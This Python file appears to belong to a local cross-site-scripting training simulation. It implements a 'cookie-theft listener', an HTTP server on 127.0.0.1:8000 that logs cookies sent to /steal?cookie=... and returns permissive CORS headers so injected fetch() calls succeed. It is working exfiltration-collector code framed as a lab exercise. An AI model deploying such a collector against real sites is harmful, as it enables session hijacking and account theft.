"""
LOCAL COOKIE-THEFT LISTENER
----------------------------
A minimal HTTP server that plays the role of "attacker's server" in
the simulation. It logs whatever cookie value gets sent to it via a
GET request to /steal?cookie=...

Run this on its own port (8000) on the SAME machine as app.py, since
this is a fully local, self-contained simulation -- nothing here ever
leaves your machine.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import datetime

LOG_FILE = "captured_cookies.log"

class ListenerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/steal":
            params = parse_qs(parsed.query)
            cookie = params.get("cookie", ["<none>"])[0]
            timestamp = datetime.datetime.now().isoformat(timespec="seconds")
            line = f"[{timestamp}] Captured cookie: {cookie}"
            print(line)
            with open(LOG_FILE, "a") as f:
                f.write(line + "\n")

        # Respond so the browser's fetch() call doesn't error out
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # suppress default request logging noise

if __name__ == "__main__":
    server = HTTPServer(("127.0.0.1", 8000), ListenerHandler)
    print("Listener running on http://127.0.0.1:8000 -- waiting for exfiltrated cookies...")
    server.serve_forever()
